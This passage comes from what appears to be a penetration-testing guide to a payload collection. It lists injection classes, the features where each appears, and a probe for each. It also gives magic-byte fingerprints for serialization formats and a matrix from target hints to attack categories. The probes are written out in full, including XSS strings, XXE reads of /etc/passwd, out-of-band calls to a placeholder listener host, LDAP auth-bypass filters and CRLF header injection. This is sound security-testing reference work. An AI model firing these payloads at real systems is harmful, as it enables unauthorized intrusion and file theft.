  - Input appears inside an HTML attribute without quoting (`<a href=USERINPUT>`).
  - Input appears inside a `<script>` block.
  - Input appears inside a JSON blob later passed to client-side `JSON.parse` → DOM XSS surface.
  - `Content-Type: text/html` on a response serving user-uploaded content.
  - Weak CSP (`default-src *`, `'unsafe-inline'`, or no CSP at all).
- **Cheap probes** (use the polyglots list for fast coverage):
  - `"><script>alert(1)</script>` (classic; fails against anything modern - useful only as an escape-char check).
  - `"><img src=x onerror=alert(1)>` (attribute breakout).
  - `javascript:alert(1)` (URL context).
  - `${alert(1)}` · `{{constructor.constructor('alert(1)')()}}` (Angular / client-template sandbox escapes).
  - `<svg onload=alert(1)>`.
  - `"'><` - does it get escaped? *How* it's escaped tells you the framework.
- **Where to inject**: reflected / stored text fields, query params, headers logged into admin panels (blind XSS), uploaded file contents served inline.
- **Which file**: `by-category/xss.txt`. 20+ contexts, event handlers, filter evasion, DOM clobbering, mutation XSS, SVG, OOB XSS for blind.
- **Pillar**: reflected (view the rendered page), **OOB** for blind (use an xsshunter / BlindXSS catcher).

### XXE - `xxe.txt` (11 payloads)

**When to suspect** - endpoints that parse XML. Modern apps use less XML than 2010-era, but specific surfaces are still extremely common:

- **Feature types** (all real, all current):
  - **SAML SSO endpoints** - by far the biggest XXE surface in modern SaaS. ACS URLs, IdP metadata upload, logout endpoints.
  - SOAP APIs (enterprise integrations, ERP, healthcare, finance - rarely deprecated, never gone).
  - XML-RPC endpoints (WordPress `xmlrpc.php`, Supervisor, some CI systems).
  - Office document upload (`.docx`, `.xlsx`, `.pptx`) - OOXML is ZIP-of-XML; XXE lands in `word/document.xml`, `xl/sharedStrings.xml`, `ppt/slides/slideN.xml`.
  - SVG upload (SVG is XML - if the parser resolves entities, XXE fires).
  - RSS / Atom feed importers.
  - OPML import (browser-bookmark and feed-reader apps).
  - Sitemap / robots.txt ingestion in SEO tools.
  - XBRL financial data processors.
  - GPX / KML / TCX upload in fitness / mapping / GIS apps.
  - DMARC / SPF report upload ("send us your DMARC reports to analyze").
  - WSDL / XSD import tools.
  - iTunes / Apple Podcast feed validators.
  - Android manifest processors in mobile analytics tools.
  - Adobe XMP metadata extractors (usually `lxml` / `libxml2` underneath).
  - JMX / JConsole over XML.
- **Visual / behavioral cues**:
  - Request `Content-Type`: `application/xml`, `text/xml`, `application/soap+xml`, `application/xml-external-parsed-entity`.
  - Upload forms accepting `.xml`, `.svg`, `.docx`, `.xlsx`, `.pptx`, `.rss`, `.atom`, `.opml`, `.gpx`, `.kml`.
  - SAML flows: `/sso`, `/saml`, `/acs`, `/metadata`, `/slo`.
  - Error leaks: `lxml.etree.XMLSyntaxError`, `org.xml.sax.SAXParseException`, `DOCTYPE is disallowed`, `Entity '...' not defined`, `Undeclared entity`, `DTD`, `SAXParseException`, `XMLStreamException`.
  - Echo test: put `<foo>hello</foo>` in the body; if `hello` reflects, parsing is live.
- **Cheap probes**:
  - Entity echo: `<!DOCTYPE foo [<!ENTITY x "hello">]><foo>&x;</foo>` → "hello" in response = entities resolve.
  - File read: `<!DOCTYPE foo [<!ENTITY x SYSTEM "file:///etc/passwd">]><foo>&x;</foo>`.
  - Blind OOB: `<!DOCTYPE foo [<!ENTITY x SYSTEM "http://{your-oob}/x">]><foo>&x;</foo>`.
  - Parameter entity (blind, needs remote DTD): `<!DOCTYPE foo [<!ENTITY % x SYSTEM "http://{your-oob}/dtd">%x;]>`.
  - XInclude (no DOCTYPE needed): `<foo xmlns:xi="http://www.w3.org/2001/XInclude"><xi:include href="file:///etc/passwd" parse="text"/></foo>`.
- **Where to inject**: the XML body - `<!DOCTYPE>` prologue, parameter entities, XInclude. For OOXML, edit `word/document.xml` (or equivalent) inside the zip before repacking.
- **Which file**: `by-category/xxe.txt`.
- **Pillar**: file-read, OOB, timing (Billion Laughs), error (DTD errors leak paths).

### XSLT Injection - `xslt-injection.txt` (30 payloads)

**When to suspect** - uncommon but distinct. Mostly enterprise / legacy / reporting-adjacent:

- **Feature types**:
  - "Custom export format" / "custom report template" in legacy BI tools (Crystal Reports, JasperReports, SSRS).
  - XML transformation pipelines in ETL tools (Talend, Informatica, StreamSets).
  - XBRL processors in finance platforms.
  - Document-conversion services using Apache FOP or Saxon.
  - Legacy .NET web parts with XSLT rendering.
  - Apache Cocoon / legacy XML-pipeline CMSes.
  - Any "upload your stylesheet" feature.
- **Visual / behavioral cues**:
  - Fields labeled `xsl`, `stylesheet`, `transform`, `template` (in an XML-world context).
  - Errors leaking: `libxslt`, `Saxon`, `net.sf.saxon`, `org.apache.xalan`, `XslCompiledTransform`, `XSLTException`, `FOP`.
  - App takes XML in and emits HTML / PDF / another XML - XSLT often sits between them.
- **Where to inject**: the stylesheet body (or the XML if it's processed by a user-influenced XSLT).
- **Which file**: `by-category/xslt-injection.txt`. XPath math, `document()` SSRF, file read via `document('file://...')`, `system-property()` info leak.
- **Pillar**: error, math, OOB, file-read.

### LDAP Injection - `ldap-injection.txt` (35 payloads)

**When to suspect** - enterprise identity surfaces:

- **Feature types**:
  - Corporate SSO against AD / Azure AD / OpenLDAP / FreeIPA.
  - Internal employee directories ("find a colleague") - the classic surface.
  - Helpdesk / ITSM tools with user lookup (ServiceNow, Jira Service Desk).
  - VPN admin panels with user management.
  - Mail-server admin (iRedMail, Zimbra, Mailcow).
  - Password reset against corporate directory.
  - Org-chart / "reports to" features.
  - Access-management tools browsing AD groups.
  - Legacy Java apps using `javax.naming.directory`.
- **Visual / behavioral cues**:
  - Domain-style usernames: `DOMAIN\user`, `user@corp.local`, `CN=user,OU=Employees,DC=corp,DC=local`.
  - Search returns names / emails / employee IDs / titles that smell like a corporate directory.
  - Errors leaking: `LDAPException`, `javax.naming.NamingException`, `InvalidSearchFilterException`, `InvalidDistinguishedNameException`, `cn=`, `uid=`, `dc=`, `ou=`, `objectClass`, `ldap://`, `ldaps://`.
  - Search results differ between `admin` and `admin*` → wildcard is being passed through to the filter.
  - Login with `*` as password succeeds (anonymous-bind + filter bypass).
- **Cheap probes**:
  - Username: `*`, `*)(uid=*`, `admin)(&`, `admin)(|(uid=*`, `)(cn=*`.
  - Search: `a*`, `*`, `(&)`.
  - Auth bypass: `admin*` + anything, `*)(uid=*))(|(uid=*` + anything.
- **Where to inject**: username / search fields that reach LDAP.
- **Which file**: `by-category/ldap-injection.txt`. Filter injection, auth bypass, wildcard timing, referral OOB.
- **Pillar**: error, math (OpenLDAP object-count math), timing (expensive wildcards), OOB (LDAP referral to your listener).

### Elasticsearch - `elasticsearch-injection.txt` (30 payloads)

**When to suspect** - full-text search with any richness is the giveaway:

- **Feature types**:
  - E-commerce product search (most modern shops are ES under the hood).
  - Log / APM viewers (Kibana, internal log explorers, Elastic APM).
  - Knowledge-base / helpcenter search.
  - Support ticket search.
  - Document / file search in DMS tools.
  - "Search everything" bars in SaaS admin panels.
  - Typeahead / autocomplete on any text field.
  - Marketing audience builders with full-text criteria.
  - Security / SIEM query bars (Elastic Security, legacy Splunk wrappers around ES).
- **Visual / behavioral cues**:
  - Search results with **highlights** (`<em>` wrapping matched terms).
  - **Facets / aggregations** in a sidebar (counts by category, tag, status).
  - Result counts like "42 results in 38ms" - that's ES's `took` field surfacing.
  - Query DSL showing up on the wire (`{"query":{"match":{"title":"x"}}}`).
  - Errors: `Elasticsearch`, `_shards`, `parsing_exception`, `search_phase_execution_exception`, `query_shard_exception`, `illegal_argument_exception`, `Lucene`, `QueryParserException`.
  - URL paths with `/_search`, `/_msearch`, `/_count`, `/_cat/`.
- **Cheap probes**:
  - Lucene syntax: `a OR b`, `title:foo`, `_exists_:title`, `title:(foo AND bar)`, `title:/regex.*/`.
  - JSON body: `{"query":{"match_all":{}}}`, `{"query":{"bool":{"must":[{"match":{"x":"y"}}]}}}`.
  - Script field: `{"script":{"source":"7*191"}}` (Painless) → `1337` math pillar.
- **Where to inject**: `q=`, search body JSON, script field, `sort` / `aggs` names.
- **Which file**: `by-category/elasticsearch-injection.txt`. Painless script injection, query-DSL breakouts, `query_string` syntax.
- **Pillar**: error, math (Painless `7*191`), timing, OOB.

### Cypher / Neo4j - `cypher-injection.txt` (27 payloads)

**When to suspect** - graph-backed features. Rare compared to SQL but common in specific SaaS niches:

- **Feature types**:
  - Fraud / AML detection platforms (connections between entities).
  - Identity / access graph tools (IAM, CSPM, permission explorers).
  - Knowledge graphs (Obsidian-style publishers, Notion graph views, Roam).
  - Recommendation engines walking "X because you liked Y".
  - Social features (friends-of-friends, "people you may know").
  - Dependency / supply-chain analysis (SBOM / SCA tools, Snyk-likes).
  - CMDB / asset inventory (ServiceNow-likes).
  - ITSM "impact analysis" (what depends on what).
  - Threat-intel platforms (actor / campaign / TTP graphs).
  - Pharmaceutical / bioinformatics pipelines walking entity relationships.
- **Visual / behavioral cues**:
  - UI visualizes relationships as a node-edge graph.
  - Phrases like "degrees of separation", "connections", "related via", "X steps away".
  - Errors: `Cypher`, `Neo4j`, `Neo.ClientError.Statement.SyntaxError`, `MATCH`, `RETURN`, `apoc.`, `:7474` (HTTP), `:7687` (Bolt).
  - Endpoints accepting a JSON `query` field containing `MATCH` / `CREATE` / `MERGE` / `RETURN`.
- **Cheap probes**:
  - `' RETURN 1337 //` in a name field that reaches `MATCH (n) WHERE n.name = '...'`.
  - `apoc.util.sleep(5000)` for timing.
  - `LOAD CSV FROM 'http://{your-oob}/x' AS line RETURN line` for OOB.
- **Where to inject**: search / filter / traversal params on graph-backed features.
- **Which file**: `by-category/cypher-injection.txt`. APOC sleep, `LOAD CSV FROM` OOB.
- **Pillar**: error, timing (APOC), OOB.

### CouchDB - `couchdb-injection.txt` (5 payloads)

**When to suspect** - rare, specific:

- **Feature types**: Hyperledger apps, legacy offline-sync mobile backends (PouchDB ↔ CouchDB), some scientific / academic apps, leftover Fauxton admin panels.
- **Visual / behavioral cues**: endpoints containing `_find`, `_all_docs`, `_changes`, `_design`, `_view`; errors mentioning `couchdb`, `Mango`, `no_usable_index`.
- **Which file**: `by-category/couchdb-injection.txt`. Mango query injection, operator injection, auth bypass.

### EL Injection (Expression Language) - `el-injection.txt` (34 payloads)

**When to suspect** - Java-stack apps, especially enterprise:

- **Feature types**:
  - Spring apps with SpEL (`@Value("#{systemProperties['user.name']}")`), Spring Cloud Gateway route predicates, Spring Actuator endpoints on legacy Boot versions.
  - Struts 2 (OGNL) - still present in enterprise (Jira, Confluence lineage).
  - JSF applications (Unified EL).
  - Thymeleaf backends where template fragments include user input.
  - Legacy "rule engine" features built on MVEL (Drools-backed).
  - Spring Integration / Spring Batch expressions in config UIs.
- **Visual / behavioral cues**:
  - URL paths ending in `.action`, `.do`, `.jsf`, `.xhtml`.
  - `JSESSIONID` cookie + Spring Whitelabel Error Page.
  - Error stacks leaking `SpelEvaluationException`, `OgnlException`, `ELException`, `ParseException at line`, `javax.el`, `org.apache.commons.ognl`.
  - Any "expression" field in a Java-stack admin tool.
- **Where to inject**: params reaching SpEL / OGNL / MVEL / Unified EL. URL parts (route predicates), form fields on Struts / JSF, Drools rule builders.
- **Which file**: `by-category/el-injection.txt`. SpEL, OGNL, MVEL, Unified EL; OOB via `java.net.URL`.
- **Pillar**: error, math, timing, OOB.

### Prototype Pollution - `prototype-pollution.txt` (12 payloads)

**When to suspect** - Node apps doing JSON merge / deep-merge / deep-clone on user input:

- **Feature types**:
  - Settings / preferences endpoints that `Object.assign` or `_.merge` user JSON into a config object.
  - User-profile updates with partial JSON patching.
  - Admin config imports ("upload your config file").
  - Webhook payload processors merging request body into an event object.
  - Form builders storing user-defined schemas.
  - Express middleware chains through `qs` or `express-fileupload` in vulnerable versions.
  - Next.js / React server components receiving JSON props and merging into defaults.
  - GraphQL resolvers merging input into default objects.
- **Visual / behavioral cues**:
  - Endpoint accepts arbitrary JSON keys with no schema error.
  - A *completely unrelated* endpoint starts returning a property you polluted (strongest signal - cross-request pollution confirmed).
  - Downstream feature exposes `isAdmin`, `role`, `permissions` derived from a base-object default.
  - Errors about unexpected object keys in places that logically shouldn't have them.
- **Cheap probes**:
  - JSON: `{"__proto__":{"polluted":"yes"}}`, `{"constructor":{"prototype":{"polluted":"yes"}}}`.
  - Query string: `?__proto__[polluted]=yes`, `?__proto__.polluted=yes`.
  - After sending, hit any unrelated endpoint and grep for `polluted:"yes"`.
- **Where to inject**: JSON body, query string, form fields, GraphQL variables.
- **Which file**: `by-category/prototype-pollution.txt`.
- **Pillar**: math (polluted value echoed), error.

### CRLF / Header Injection - `header-crlf.txt` (17 payloads)

**When to suspect** - user input ends up building a response header:

- **Feature types**:
  - Redirect params (`?next=`, `?return_to=`, `?redirect_uri=`, `?continue=`) reflected into `Location:`.
  - "Download" endpoints with dynamic `Content-Disposition: attachment; filename=<user input>`.
  - Language / currency / timezone selectors that set cookies.
  - Custom CORS origin reflection (`Access-Control-Allow-Origin: <user Origin>`) without a whitelist.
  - Analytics / tracking headers built from query params.
  - Cache-Control tied to user input (cache poisoning primitive).
  - Custom CDN / edge-worker rules.
  - Legacy edge proxies building headers from request data.
- **Visual / behavioral cues**:
  - Your input appears verbatim in a response header (`Location:`, `Set-Cookie:`, `Content-Disposition:`, `Access-Control-Allow-Origin:`).
  - `Origin: https://evil.com` gets echoed back in CORS headers.
  - A URL param controls which filename the browser downloads.
- **Cheap probes**:
  - Redirect param: `%0d%0aX-Injected:%20yes` - does a new response header appear?
  - `foo%0d%0aSet-Cookie:%20pwned=1`.
  - CORS: `Origin: https://evil.com` → `Access-Control-Allow-Origin: https://evil.com` back?
- **Where to inject**: redirect targets, filenames in download features, cookie-setting parameters, headers echoed into responses.
- **Which file**: `by-category/header-crlf.txt`.
- **Pillar**: math (injected header reflected), OOB (Host header SSRF), reflected.

### Format String - `format-string.txt` (38 payloads)

**When to suspect** - rare on modern web apps, but specific niches:

- **Feature types**:
  - Embedded web UIs (routers, NAS, printers, IoT, cable modems, IP cameras, BMS, HVAC controllers).
  - Logging configurations where users control the log-format pattern in admin consoles.
  - Python `.format()` applied to user strings in "template preview" features - the bad pattern is `"...{0.secret}...".format(internal_obj)` where the user controls the format string.
  - .NET `String.Format(userInput, args)` - identical footgun.
  - C / C++ CGI in legacy embedded devices.
  - Old Apache mod_perl / mod_c / native handlers.
  - Java `String.format()` with user-controlled format parameter.
- **Visual / behavioral cues**:
  - `{0}` / `{1}` / `%s` in the input produces "index out of range" or object-repr garbage.
  - The app advertises "custom log format" / "custom date format" with placeholder syntax.
  - Errors: `IndexError: tuple index out of range` (Python), `FormatException` / `IndexOutOfRangeException` (.NET), segfaults / truncated responses (C).
- **Cheap probes**:
  - `{0}`, `{0.__class__}`, `{0.__class__.__bases__}`, `{0:1000000}` (DoS via huge padding).
  - `%s`, `%x`, `%n`, `%s%s%s%s%s%s`.
  - `{0:X}`, `{0:X999}` (.NET).
- **Where to inject**: log-format fields, dynamic report titles, format-config fields in admin UIs.
- **Which file**: `by-category/format-string.txt`.
- **Pillar**: error, math.

### Polyglots / Edge Cases - `polyglots.txt` (246 payloads)

**When to use** - **first**, before committing to a category. Cross-context polyglots break out of multiple parsing contexts at once; one payload tests ~20 injection classes simultaneously. The *shape* of the first non-empty response tells you which category to drill into.

- **Contents**: cross-context polyglots (SQLi + XSS + command + template delimiters fused), buffer-overflow probes, integer boundaries (`2147483648`, `-0`, `NaN`, `Infinity`), type confusion, null bytes, UTF-8 / UTF-16 oddities, zero-width characters.
- **Pillar**: error (most common - the polyglot trips a parser somewhere), reflected (XSS surface), math (if a calculator-like sink exists).
- **Workflow**: Fire these at every parameter *before* touching category-specific lists. A single hit narrows you to one category; then switch to that category's dedicated file.

---

## 3. Dangerous Serialization Byte Fingerprints

Before you fire deserialization payloads, identify *which* format you're looking at. Picking the wrong framework's payload against the wrong sink produces zero signal and wastes requests. The 232-payload `deserialization.txt` covers 31 frameworks - you want to load only the ~5-15 payloads that match the blob in front of you, not all 232.

Two columns matter most in practice:
- **Raw magic bytes** - when you can see the byte stream directly (file upload, binary body, captured cookie after URL-decode).
- **Base64 first characters** - far more common. Cookies, tokens, `__VIEWSTATE`, form fields, and API bodies are almost always base64-wrapped.

### Python

| Framework | Raw magic (hex) | Base64 prefix | ASCII / text hint | Notes |
|---|---|---|---|---|
| Pickle P0 (ASCII) | `63 ...` (`c`) e.g. `c__builtin__\n` | `Y19fYnVpbHRpbl9f` / `KGRw` / `KGxw` | starts with `c`, `(`, `}`, `]` (all ASCII) | Protocol 0 is ASCII-only and longest base64; legacy default |
| Pickle P2 | `80 02` | `gAJ` (when followed by GLOBAL opcode `c`) | - | `\x80` = PROTO, `\x02` = protocol 2 |
| Pickle P3 | `80 03` | `gAN` (when followed by `c`) | - | Py3 default pre-3.8 |
| Pickle P4 | `80 04 95` | `gASV` | - | Py3.8+ default; `\x95` = FRAME opcode |
| Pickle P5 | `80 05 95` | `gAWV` | - | Py3.8+, supports out-of-band buffers |
| PyYAML (unsafe) | `21 21 70 79 74 68 6f 6e` | `ISFweXRob24` | `!!python/object`, `!!python/object/apply:`, `!!python/name:` | Requires `yaml.Loader`, `yaml.UnsafeLoader`, or `yaml.FullLoader` on 5.x |
| jsonpickle | `7b 22 70 79 2f` | `eyJweS8` | `{"py/object":` / `{"py/reduce":` / `{"py/type":` | JSON with `py/` type tags |
| Python Marshal (`marshal.loads`) | `63` / `e3` / `fa 0d 0d 0a ...` | `Yw` / `4w` | - | Internal CPython bytecode format; version-specific |

### PHP

| Framework | Raw magic (hex) | Base64 prefix | ASCII / text hint | Notes |
|---|---|---|---|---|
| `unserialize()` object | `4f 3a` | `Tzo` | `O:12:"ClassName":` | class-name length + name |
| `unserialize()` array | `61 3a` | `YTo` | `a:3:{...}` | array with N elements |
| `unserialize()` string | `73 3a` | `czo` | `s:5:"hello"` | length-prefixed string |
| PHAR (TAR-backed) | TAR header + PHP stub + `__HALT_COMPILER();` | varies | stub contains `<?php` | Metadata section is the deserialization sink; triggered via `phar://` wrapper |
| PHAR (ZIP-backed) | `50 4b 03 04` (ZIP local header) | `UEsDBA` | `.phar` extension | Any stream function on `phar://` triggers unserialize of metadata |
| PHAR (PHAR-native) | custom PHAR stub + serialized metadata | - | `.phar` | Same sink as above |

### Java

| Framework | Raw magic (hex) | Base64 prefix | ASCII / text hint | Notes |
|---|---|---|---|---|
| `ObjectInputStream` | `ac ed 00 05` | `rO0AB` | - | STREAM_MAGIC `0xaced` + version `0x0005`. **Single most reliable Java fingerprint.** |
| XMLDecoder (`java.beans.XMLDecoder`) | `3c 3f 78 6d 6c` ... `3c 6a 61 76 61 20 76 65 72 73 69 6f 6e` | `PD94bWw` ... contains `PGphdmEgdmVyc2lvbg` | `<?xml ... <java version=` | `<java version=` tag is the smoking gun |
| XStream | `3c` (`<`) | `PA` / `PD` | `<object-stream>`, `<map>`, `<com.acme.Foo>` | XML with fully-qualified class-name tags |
| Jackson (polymorphic) | `7b 22 40 63 6c 61 73 73` | `eyJAY2xhc3M` | `{"@class":"com.` | `@class` field = Jackson's polymorphic type discriminator |
| Fastjson (Alibaba) | `7b 22 40 74 79 70 65` | `eyJAdHlwZQ` | `{"@type":"com.` | `@type` = Fastjson type marker (distinct from Jackson's `@class`) |
| SnakeYAML | `21 21` or `2d 2d 2d 0a 21 21` | `ISE` / `LS0tCiEh` | `!!com.example.Foo` / `!!javax.` | YAML type tag pointing at a Java class |
| Hessian 2 | `48 02 00` or `43` (`c`) | `SAIA` / `Qw` | - | Binary; length-prefixed in most deployments |
| Kryo | `01 xx` or class-registration id | - | binary, no stable global magic | Usually framed by an application-level length prefix |
| JNDI / Log4Shell (trigger, not format) | - | - | `${jndi:ldap://`, `${jndi:rmi://`, `${jndi:dns://`, `${jndi:ldaps://` | Not a serialization format - an injection string that *causes* Java to deserialize a remote payload via RMI/LDAP/CORBA |
| Apache Commons Collections (gadget) | delivered via `ObjectInputStream` above | `rO0AB` + `sr` followed by `org.apache.commons.collections` | inside a Java-serialized blob | Fingerprint is the outer `rO0AB`; CC is a *gadget chain*, not a distinct format |

### .NET

| Framework | Raw magic (hex) | Base64 prefix | ASCII / text hint | Notes |
|---|---|---|---|---|
| BinaryFormatter | `00 01 00 00 00 ff ff ff ff 01 00 00 00 00 00 00 00` | `AAEAAAD/////` | - | SerializationHeaderRecord. **Single most reliable .NET fingerprint.** |
| LosFormatter | BinaryFormatter (optionally prefixed with MAC) | `/w` / `/wE` | - | Used by classic WebForms `__VIEWSTATE` |
| ObjectStateFormatter / ViewState | BinaryFormatter inside, optional HMAC | `/wE`, `/wEP`, `/wEW` | - | `__VIEWSTATE` form field and `__EVENTVALIDATION` |
| SoapFormatter | `3c 53 4f 41 50 2d 45 4e 56 3a 45 6e 76 65 6c 6f 70 65` | `PFNPQVAtRU5WO` | `<SOAP-ENV:Envelope` | XML SOAP envelope |
| XmlSerializer | `3c 3f 78 6d 6c` | `PD94bWw` | `<?xml` + known-root element | Safer than most - attacker must control a type the serializer expects |
| NetDataContractSerializer | `3c` + XML with `z:Type=` / `z:Assembly=` attributes | `PA` + `eiBUeXBl` inside | `z:Type="System.`, `z:Assembly="mscorlib` | **Dangerous sibling** of DataContractSerializer |
| DataContractSerializer | `3c` (`<`) | `PA` | `<ArrayOfstring xmlns=`, `<Root i:type=` | Generally safe unless `KnownTypes` is attacker-controlled |
| Json.NET (`TypeNameHandling != None`) | `7b 22 24 74 79 70 65` | `eyIkdHlwZQ` | `{"$type":"System.` | `$type` = Newtonsoft's type discriminator |
| JavaScriptSerializer (`SimpleTypeResolver`) | `7b 22 5f 5f 74 79 70 65` | `eyJfX3R5cGU` | `{"__type":"System.` | Legacy ASP.NET Ajax |
| MessagePack (`Typeless`) | `81 a7` or `dc xx` / `dd xx` with `$type` key | - | binary; presence of `$type` string inside | Typeless mode is the sink |
| Microsoft `BinaryMessageFormatter` | wraps BinaryFormatter | `AAEAAAD/////` | - | Same payload as BinaryFormatter, different sink |

### Node.js / JavaScript

| Framework | Raw magic (hex) | Base64 prefix | ASCII / text hint | Notes |
|---|---|---|---|---|
| `node-serialize` (CVE-2017-5941) | JSON containing `5f 24 24 4e 44 5f 46 55 4e 43 24 24 5f` | `eyJ` + substring `XyQkTkRfRlVOQyQkXw` | `"_$$ND_FUNC$$_"` | The literal string is the smoking gun |
| js-yaml (`LOAD_SCHEMA` unsafe) | `21 21 6a 73 2f` | `ISFqcy8` | `!!js/function`, `!!js/regexp`, `!!js/undefined` | Look for `!!js/` type tag |
| funcster | JSON with `__js_function` | `eyJf` + `X19qc19mdW5jdGlvbg` | `"__js_function":"function` | Function-serialization wrapper |
| cryo | `7b 22 72 6f 6f 74` | `eyJyb290` | `{"root":` with `_cryo_` markers | Deprecated but still in legacy apps |
| serialize-javascript (`{unsafe:true}`) | - | - | `"function(...)"` embedded in JSON output | Safe by default; dangerous only when called with `unsafe: true` |
| v8.serialize() | `ff 0d` / `ff 0e` | `/w0` / `/w4` | - | Internal V8 format; rarely crosses the wire |

### Ruby

| Framework | Raw magic (hex) | Base64 prefix | ASCII / text hint | Notes |
|---|---|---|---|---|
| `Marshal.load` | `04 08` | `BAg` | - | Version bytes `\x04\x08`. **Single most reliable Ruby fingerprint.** |
| Psych / `YAML.load` | `2d 2d 2d` | `LS0t` | `--- !ruby/object:`, `--- !ruby/hash:`, `!ruby/class`, `!ruby/module` | YAML with `!ruby/` tags |
| Oj (`mode: :object`) | `7b 22 5e 6f` / `7b 22 5e 63` | `eyJebyI` / `eyJeYyI` | `{"^o":"Foo"`, `{"^c":"Klass"` | `^o` / `^c` are Oj's class markers |
| `JSON.load` (not `JSON.parse`) | - | - | Same shape as JSON but deserializes objects tagged with `create_id` (`"json_class"`) | Sink behavior, not a distinct format |

### Perl

| Framework | Raw magic (hex) | Base64 prefix | ASCII / text hint | Notes |
|---|---|---|---|---|
| Storable (native order) | `05 07 ...` + `70 73 74 30` | contains `cHN0MA` | `pst0` magic after version bytes | `pst0` is the canonical marker |
| Storable (network order) | `05 07 02` + `pst0` | `BQcCcHN0MA` | - | `nstore()` variant |
| YAML::XS / YAML::Syck | `2d 2d 2d` | `LS0t` | `!!perl/hash:`, `!!perl/code`, `!!perl/array` | Look for `!!perl/` tags |
| Data::Dumper output | - | - | `$VAR1 = ` | Safe to parse; dangerous only if the consumer calls `eval` on it |

### Cross-cutting wrappers

These aren't serialization formats - they're common *transports* carrying serialized data. Unwrap them first, then re-fingerprint the inner bytes against the tables above.

| Wrapper | First-byte hint | Unwrap to find |
|---|---|---|
| Base64 | `[A-Za-z0-9+/]` charset + optional `=` padding | raw bytes → re-check magic |
| Base64url | `[A-Za-z0-9-_]` (no `+/`) | raw bytes |
| URL encoding | `%` + hex pairs | usually base64 inside |
| JWT | `eyJ` + `.` + `eyJ` + `.` + signature | JWT header/payload are JSON; check for `alg:none`, not deserialization |
| Gzip | `1f 8b` | decompress → re-fingerprint |
| Zlib / deflate | `78 9c`, `78 da`, `78 01` | decompress → re-fingerprint |
| Zstd | `28 b5 2f fd` | decompress → re-fingerprint |
| HTTP cookie | `Name=value;` | value is often URL-encoded base64 serialized data |
| ASP.NET `__VIEWSTATE` | `/wE` after URL-decode | LosFormatter / ObjectStateFormatter → BinaryFormatter |
| Protobuf envelope | varint + wire-type | binary framing; rarely carries deserialization sinks |

### Practical recognition workflow

1. **Grab the opaque blob** - cookie, header, body field, hidden form value, WebSocket message, upload body.
2. **Strip wrappers**: URL-decode, then base64-decode if it matches `[A-Za-z0-9+/=]`. Decompress if gzip/zlib magic appears.
3. **Check the first 2-8 raw bytes** against the magic-bytes column.
4. **If you only have base64** (don't want to decode, or the wrapper is awkward): check the 3-6 character prefix column.
5. **Still ambiguous?** Grep the blob for ASCII hints: `__builtin__`, `!!python/`, `!!js/`, `!ruby/`, `$type`, `@class`, `@type`, `__type`, `_$$ND_FUNC$$_`, `pst0`, `<java version=`, `${jndi:`, `z:Type=`.
6. **Matched a framework?** → load only that framework's section from `by-category/deserialization.txt` instead of the whole 232-payload file. Typical 10-to-1 reduction in requests - same coverage, order of magnitude less WAF noise.

### Quick base64 cheat-card (memorize these)

These 16 prefixes cover roughly 95% of dangerous serialized data you'll see in real engagements.

| You see... | It is... |
|---|---|
| `rO0AB` | Java `ObjectInputStream` |
| `AAEAAAD/////` | .NET BinaryFormatter (and `BinaryMessageFormatter`) |
| `/wE` | ASP.NET `__VIEWSTATE` (LosFormatter / ObjectStateFormatter) |
| `BAg` | Ruby `Marshal` |
| `gASV` | Python pickle P4 |
| `gAJ` | Python pickle P2 |
| `gAN` | Python pickle P3 |
| `gAWV` | Python pickle P5 |
| `Y19fYnVpbHRpbl9f` | Python pickle P0 w/ `c__builtin__` |
| `ISFweXRob24` | PyYAML `!!python/` |
| `Tzo` / `YTo` | PHP `unserialize()` (object / array) |
| `eyJAdHlwZQ` | Fastjson `"@type"` |
| `eyJAY2xhc3M` | Jackson `"@class"` |
| `eyIkdHlwZQ` | Json.NET `"$type"` |
| `eyJfX3R5cGU` | JavaScriptSerializer `"__type"` |
| `XyQkTkRfRlVOQyQkXw` (substring) | node-serialize `_$$ND_FUNC$$_` |
| `ISFqcy8` | js-yaml `!!js/` |
| `PFNPQVAtRU5WO` | .NET SoapFormatter (`<SOAP-ENV:Envelope`) |
| `PGphdmEgdmVyc2lvbg` (substring) | Java XMLDecoder (`<java version=`) |
| `BQcCcHN0MA` | Perl Storable network order (`pst0`) |

**Heuristics when the prefix is ambiguous** (two frameworks share base64 leading chars):
- `eyJ` = *any* JSON in base64. Look at the next substring: `AY2xhc3M` → Jackson, `AdHlwZQ` → Fastjson, `fX3R5cGU` → JavaScriptSerializer, `kdHlwZQ` → Json.NET, then fall back to ASCII sniffing.
- `gA` = pickle. Check 3rd base64 char: `J`/`I` → P2, `N`/`M` → P3, `S` → P4, `W` → P5.
- `LS0t` = any YAML (`---`). Language depends on the tag that follows: `!ruby/`, `!!python/`, `!!js/`, `!!perl/`, or `!!com.example.` (Java/SnakeYAML).
- `PA` / `PD` = any XML (`<`). Disambiguate by tag: `SOAP-ENV:Envelope` (.NET Soap), `object-stream` (XStream), `java version=` (XMLDecoder), `z:Type=` (NetDataContractSerializer).

---

## 4. Target-Hint → Category Matrix

Translate "what you're seeing" into "what to try." Rows are *signals*; cells list categories in priority order.

| Hint / Context | Primary | Secondary | Pillar |
|---|---|---|---|
| `id=42` style numeric param | SQLi (numeric), NoSQL (if Mongo) | IDOR | error, math, timing |
| `q=`, `search=`, filter | SQLi, Elasticsearch, LDAP, Cypher | XSS (if reflected) | error, reflected |
| Login form, JSON body | SQLi, NoSQL ($ne), LDAP | Deserialization (if opaque tokens) | error, math |
| URL / callback / webhook param | SSRF, CRLF | XSS (if reflected) | OOB, reflected |
| `file=`, `template=`, `include=` | Path Traversal, SSTI, Code Injection (LFI→RCE) | XXE (if XML) | file-read, math |
| Comment / bio / rich text | XSS | SSTI (only if rendered through engine) | reflected, math |
| XML/SOAP/SAML endpoint | XXE, XSLT | SSRF (via entity) | file-read, OOB |
| Office doc upload (DOCX/XLSX/PPTX) | XXE (inside OOXML) | SSRF, Deserialization (macros out of scope) | file-read, OOB |
| JSON body with free-form keys | Prototype Pollution, NoSQL | Deserialization | math, error |
| Base64 cookie / ViewState / long opaque token | Deserialization (match framework) | - | OOB, math |
| Formula/expression/rule field | Code Injection, EL Injection, SSTI | OS Cmd | math, timing |
| `cmd=`, ping/traceroute-style tool | OS Cmd Injection, Code Injection | SSRF | math, OOB |
| Log/format/report title field | Format String, SSTI | XSS | error, reflected |
| Param reflected into `Location:` / `Set-Cookie` | CRLF | XSS, SSRF (Host) | reflected |
| Cloud-hosted app + any URL param | SSRF (IMDS) | CRLF | OOB |
